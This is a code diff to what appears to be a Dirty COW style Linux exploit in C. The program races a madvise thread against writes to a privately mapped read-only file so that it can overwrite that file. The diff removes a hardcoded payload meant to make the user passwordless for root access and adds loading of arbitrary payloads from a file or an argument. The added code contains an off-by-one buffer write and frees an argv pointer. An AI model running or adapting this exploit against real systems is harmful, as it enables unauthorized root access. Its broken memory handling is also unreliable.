@@ -76,10 +76,19 @@ void *madviser_thread(void *arg) {
 	return NULL;
 }
 
+// Load Payload into string from specified file
+char *loadPayload(int fd) {
+	int size_file = lseek(fd, 0, SEEK_END);
+	lseek(fd, 0, SEEK_SET);
+	char *string_ptr = calloc(size_file, sizeof(char));
+	ERR_IF(read(fd, string_ptr, size_file) < 0);
+	string_ptr[size_file] = '\0';
+	return string_ptr;
+}
+
 void print_help() {
 	printf("-f, --file   \t name of file contatining the payload\n"
-			"-s, --string\t interpret payload in the file as a string\n"
-			"-x, --hex   \t interpret payload in the file as hex values\n"
+			"-s, --string\t use command line arg string as payload\n"
 			"-o, --offset\t offset postition for lseek (hex)\n"
 			"-a, --append\t append to target file\n"
 			"-h, --help  \t help print out\n"
@@ -100,14 +109,13 @@ PayloadInfo parse_opts(int argc, char *argv[]) {
 		static struct option long_options[] = {
 			{"file",    required_argument, 0, 'f' },
 			{"append",  no_argument,       0, 'a' },
-			{"hex",     no_argument,       0, 'x' },
 			{"string",  no_argument,       0, 's' },
 			{"offset",  required_argument, 0, 'o' },
 			{"help",    no_argument,       0, 'h' },
 			{0,         0,                 0,  0  }
 		};
 
-		c = getopt_long(argc, argv, "ahsxf:o:", long_options, &option_index);
+		c = getopt_long(argc, argv, "ahs:f:o:", long_options, &option_index);
 
 		if (c == -1)
 			break;
@@ -125,16 +133,13 @@ PayloadInfo parse_opts(int argc, char *argv[]) {
 			case 'f':  // file containing payload
 				info.input_fd = open(optarg, O_RDONLY);
 				ERR_IF(info.input_fd < 0);
+				info.string = loadPayload(info.input_fd);
 				break;
 			case 'o':  // offset position for payload (hex)
 				sscanf(optarg, "%x", (unsigned int*) &info.offset);
-				printf("offset: %d\n", (int) info.offset);
 				break;
 			case 's':
-				// TODO take option as payload string
-				break;
-			case 'x':
-				// TODO take option as payload hex string
+				info.string = argv[optind-1];
 				break;
 			case 'a':  // append to target file
 				info.append = true;
@@ -167,8 +172,6 @@ int main(int argc, char *argv[]) {
 	struct stat file_info;
 	ERR_IF(fstat(info.target_fd, &file_info) < 0);
 
-	// Make current user passwordless, able to use "sudo su" to gain root access
-	info.string = "moo:*:";
 	info.loc_in_mem = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, info.target_fd, 0);
 
 	pthread_t thread_1, thread_2;
@@ -181,6 +184,7 @@ int main(int argc, char *argv[]) {
 
 	close(info.input_fd);
 	close(info.target_fd);
+	free(info.string);
 
 	return EXIT_SUCCESS;
 }
